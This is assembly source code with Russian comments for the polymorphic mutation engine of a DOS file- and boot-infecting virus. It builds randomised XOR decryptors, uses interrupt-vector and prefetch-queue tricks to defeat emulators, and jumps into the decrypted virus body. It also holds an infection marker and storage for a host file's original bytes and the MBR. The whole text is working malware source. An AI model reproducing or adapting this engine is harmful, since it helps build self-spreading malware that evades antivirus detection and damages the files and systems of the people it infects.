;-----------------------------------------------------------------------
;------------------- Процедуры настройки комманд -----------------------

				; SI  в начале каждой указывает на начало
				; записи в базе для данной комманды

    MOV_NUMBER PROC		; Формирует комманду  MOV Reg,Immed
				; Reg согласно группе, Immed из поля Operand
	call GETREG		; получить регистр по номеру группы
	add  al,0B8h		; "MOV"
	stosb
	mov  ax,[si][OPERAND]
	stosw
	retn
        MOV_NUMBER ENDP

    MOV_SEG_R1 PROC		; комманда MOV SegReg,Reg
				; здесь SegReg постоянен = ES
	CALL GETREG
	CBW			
	XCHG AH,AL
	ADD  AX,0C08EH
	STOSW
	RETN
    MOV_SEG_R1 ENDP

    MOV_KEY PROC			; "MOV es:[0200h..02FFh],Reg"
	MOV AX,8926H
	STOSW
	CALL GETREG
	MOV CL,3
	SHL AL,CL
	ADD AL,6
	STOSB				; REG*8+6

	MOV DL,0FFH			; Адрес вектора
	CALL RND
	ADD DX,0200H
	MOV DS:[TMPVEC-MAYHEM],DX	; Придется оттуда еще и вычитать
	MOV ES:[DI],DX
	INC DI
	INC DI
	RETN
    MOV_KEY ENDP

    SUB_KEY PROC		; SUB ES:[200..2FF],reg
				; вычитаем то же число из того же вектора
	MOV AX,2926h
	STOSW

	CALL GETREG
	MOV CL,3
	SHL AL,CL
	ADD AL,6	
	STOSB
	MOV AX,DS:[TMPVEC-MAYHEM]
	STOSW
	mov al,@PUSHF		; сохраним флаги, чтобы мусор их не попортил
	stosb
	retn
    sub_key endp

    jmp_ok proc			; JZ XOR_COMMAND
	MOV AL,@POPF
	STOSB
					; Переход на комманду расшифровки
					; Мы еще не знаем, куда    ┌┬┬┐ ┌──┐
	MOV DS:[FOR1-MAYHEM],DI		; Запомним адрес операнда  ├JZ┤ │??│
	INC BYTE PTR DS:[FOR1-MAYHEM]   ;                          └┴┴┘ └──┘ 
	MOV AX,0274h			; комманда JZ $+...(Пока 2)
	STOSW
	retn
    jmp_ok endp

    int20 proc
	mov ax,20cdh		; int 20h
	stosw
	retn
    int20 endp

				; Формирователь комманды расшифровывания и 
				; настройка переходов на нее
    DEXOR PROC			; xor [],*
				; info:    XOR  [si],REG  =  31 , 04+08*REG
				;               [di],REG  =  31 , 05+08*REG
				;               [bx],REG  =  31 , 07+08*REG

				; Теперь известен операнд перехода на XOR
	MOV AX,DI		; адрес комманды XOR
	SUB AX,DS:[FOR1-MAYHEM] ; Расстояние JZ...XOR.
	DEC AX			
	MOV BX,DS:[FOR1-MAYHEM] ; Куда заносить операнд
	MOV ES:[BX],AL		; OK

	mov ds:[offset LBL1-MAYHEM],di	     ; для настройки JMP цикла 

	MOV AL,@PFX_CS		; префикс CS:
	STOSB
				; Комманда оперирует двумя регистрами:
				; поле REG_GROUP - только для одного
				; Номера групп здесь помещены в OPERAND.
	mov  bx,[si][OPERAND]   ; Находим номер индексного регистра для XOR
	push bx			; Он - в старшем байте слова Operand
	xchg bl,bh
	xor  bh,bh
	mov  al,[bx][R_GRP-MAYHEM]

	mov  ah,4		; 4,5,или 7  в зависимости от SI,DI,BX
	cmp  al,R_SI
	je   lb1
	inc  ah
	cmp  al,R_DI
	je   lb1
	add  ah,02
	lb1:

	pop bx			; регистр с ключом для XORа
	xor bh,bh
	mov al,[bx][R_GRP-MAYHEM]
	MOV CL,3		; x8 + (4,5 или 7)
	SHL AL,CL
	add ah,al

	mov al,31h		; 2-байтовая комманда XOR [IndexReg],Reg
	stosw
	retn
    dexor endp

    inc_cnt proc                ; Инкремент словного регистра
	call GETREG
	add  al,40h
	stosb
	retn
    inc_cnt endp

    dec_cnt proc		; Декремент словного регистра
	call GETREG
	add al,48h
	stosb
	retn
    dec_cnt endp

    dec_cnt_pushf proc		; Декремент словного регистра и PUSHF
	call GETREG
	add  al,48h
	stosb
	mov al,@PUSHF
	stosb
	retn
    dec_cnt_pushf endp

    JMP_CONT PROC		; Формирование условного перехода на продолже-
				; ние XOR'а или выхода.
	MOV AL,@POPF
	STOSB
	MOV AX,0374H		; Выход из цикла
	STOSW
	MOV AL,0E9h		; Переход опять на XOR
	STOSB

	MOV AX,DS:[LBL1-MAYHEM] 	; настройка перехода на XOR
	SUB AX,DI
	SUB AX,2		
	STOSW
	RETN
    jmp_cont  endp

    END_VIR  PROC		; переход на тело вируса
	call MOV_NUMBER		; здесь: MOV REG,offset StartDecrypted
	call PUSHER		; здесь: PUSH REG
	mov al,0c3h		; Инструкция RETN
	stosb
	retn
    end_vir endp

    ADD_DISP PROC		; ADD Reg(XORKEY), Смещение_XORа
	CALL GETREG
	CBW
	XCHG AH,AL
	ADD  AX,0C081H
	STOSW
	MOV  AX,[SI+OPERAND]	; операнд - смещение ключа для XOR
	STOSW
	RETN
    ADD_DISP ENDP

  QUEUE PROC			; трик с конвейером
	MOV  AX,0C72EH		; MOV CS:[След_Комманда],JMP_к_матери
	STOSW
	MOV  AL,06H
	STOSB

	MOV  AX,DS:[VARSRC-MAYHEM]
	ADD  AX,INIT-START+4	
	ADD  AX,DI
	SUB  AX,DS:[DSTADDR-MAYHEM]
	STOSW
	MOV  AX,084EBH		; JMP SHORT $-к_такой_то_матери
	STOSW
	MOV  AX,9090H		; они будут заменены на JMP $-к_..._матери
	STOSW
	RETN
  QUEUE ENDP

;------------------------------  общие процедуры настройки комманд  --------

    getreg proc				; находит и возвращает номер регистра
					; данной группы для данного поля базы
	xor  bh,bh
	mov  bl,[si][R_GROUP]
	mov  al,[bx][R_GRP-MAYHEM]	; результат
	retn
    getreg endp

    pusher proc				; добавляет инструкцию PUSH
	call GETREG
	add  al,50h
	stosb
	retn
    pusher endp

; -------------------  MUTABLE : База данных MAYHEM  -----------------------

	; ------------ Образец расшифровщика ---------------
	; N  Границы   Комманда
        ; -  ----      ----------------------------- 
	; 0  0..7      MOV CS:[NEXTCOMMAND],MAD_CODE 
	; 1  0..7      MOV SI,OFFSET CRYPTED
	; 2  0..7      mov cx,(offset ENDCRYPTED-CRYPTED)/2
	; 3  0..5      mov dx,XORKEY
	; 4  0..4      mov ax,0000
	; 5     5      mov es,ax
	; 6   	6      mov es:[0200h],dx
	; 7     7      sub es:[0200h],dx
	;	       pushf
	; 8	8      popf
	;	       jz  Okay
	; 9     9      lazha: int 20h
	; 	       okay:
	; A     A      xor cs:[si],dx
	; B  B..F      inc si
	; C  B..F      inc si
	; D  B..D      dec cx
	; E  E..F      dec cx
	;      	       pushf
	; F  B..F      add dx,XORdis
	; 10   10      popf
	;	       jnc okay
	; 11   11      retn
	
MUTAB:						
					; Элемент "Трюк с конвейером"
	DW QUEUE-MAYHEM			; Адрес настройщика
	DB 00,07,00			; С позиции 0 до позиции 7
					; реальное положение будет определено
	DB 00                           ; Регистровая группа 0
DSTADDR	DW ?				; ENTRY DI    Операнд. Переменная 
					; инит-ся до входа в MAYHEM.

 	dw MOV_NUMBER-MAYHEM		; MOV SI,offset CRYPTED
	db 00,07,00
	db 00
VARsrc	dw ?				; смещение шифрованного в новой копии

	dw MOV_NUMBER-MAYHEM		; MOV CX,(ENDCRYPTED-CRYPTED)/2
	db 00,07,00
	db 01
	dw INIT-START			; размер вируса

	dw MOV_NUMBER-MAYHEM		; mov dx,XORKEY
	db 00,05,00
	db 02
VARxor	dw ?

	dw MOV_NUMBER-MAYHEM		; mov ax,0000
	db 00,04,00
	db 03
	dw 0000

	dw MOV_SEG_R1-MAYHEM		; mov es,ax
	db 05,00,00
	db 03
	dw ?

	dw MOV_KEY-MAYHEM		; mov es:[0200..0300],dx
	db 06,00,00
	db 02
	dw ?

	dw SUB_KEY-MAYHEM		; sub es:[0200..0300],dx
	db 07,00,00
	db 02
	dw ?

	dw JMP_OK-MAYHEM		; jz $+?
	db 08,00,00
	db 0FFh
	dw 0004

	dw INT20-MAYHEM			; int  20h
	db 09,0,0
	db 00
	dw 0000

	dw DEXOR-MAYHEM			; xor [*],*
	db 0AH,00,00
	db 0FFh				; группа 0FFh (условно) -
	dw 0002				; в опреанде 2 регистра:Low=SRC,Hi=DST

	dw INC_CNT-MAYHEM		; inc address
	db 0BH,04,00
	db 00
	dw ?

	dw DEC_CNT-MAYHEM		; dec size
	db 0Bh,02,00
	db 01
	dw ?

	dw INC_CNT-MAYHEM		; inc address ( две комманды INC:  +2)
	db 0Bh,04,00
	db 00
	dw ?

	dw DEC_CNT_PUSHF-MAYHEM  	; dec size \ PUSHF
	db 0Eh,00,00
	db 01
	dw ?

	dw ADD_DISP-MAYHEM		; ADD XorKey,XorDispl
	db 0Bh,04,00
	db 02
VARdis	dw ?				; смещение для ключа XOR

	dw JMP_CONT-MAYHEM		; продолжение цикла
	db 10h,00,00
	db ?
	dw ?

	dw END_VIR-MAYHEM		; переход на расшифрованное тело
	db 11h,00,00
	db 00		
VARretf	dw ?				; адрес начала тела для перехода

	ENDMUTAB DW 0000		; конец базы данных MAYHEM	

	R_USED db 00010000b		; Флаг использованных регистров

	R_MASK db 11001000b		; Гр.0 (индексные регистры)
	       db 11101111b		; Гр.1 (все регистры, кроме SP)
               db 11101111b             ; Гр.2
	       db 11101111b             ; Гр.3
	       db 0			; конец таблицы масок

	R_GRP  db 8 dup(0) 		; результат закрепления регистров за
					; каждой группой

	lbl1   dw ?			; адрес начала комманды XOR
	for1   dw ?			; адрес пустующего операнда JMP
        TMPVEC DW ?			; пишем/читаем в вектор из IntTable 

MAYHEM_OFF:				; КОНЕЦ СКАЗОЧКЕ...
	RETF
;----------------------------------------------------------------------------
	DB  (OFFSET INIT-START) MOD 2+2 DUP(90H)	;  ADJUST TO EVEN
;------ Здесь находится расшифровщик (будет сформирован MAYHEM'ом) ----------
INIT:
	JMP  START
; ─────────────────────────────────────────────────────────────────────────────
INFSIGN  db 'DOA'
				; ДАННЫЕ ВНЕ ТЕЛА ВИРУСА 
ENDALL:
OUTSIDEDATA:
		ORIGINAL    DB 3 DUP(?)		; начало обрабатываемого файла	
DISKSECTOR:					; MBR
		EXEHDRCONT  DB 15H DUP(?)       ; 
		OFFS400	    DW ?		; 'NE' при проверке WinEXE
		FLEN        DW ?,?		;  Длина, размер файла
		FSIZE       DW ?,?
		CURRDISK    DB ?		; Номер диска

		BODYPREPARE DW (INIT-Start)/2 dup(?)	; для шифровки тела
THEENDATALL:
END START0

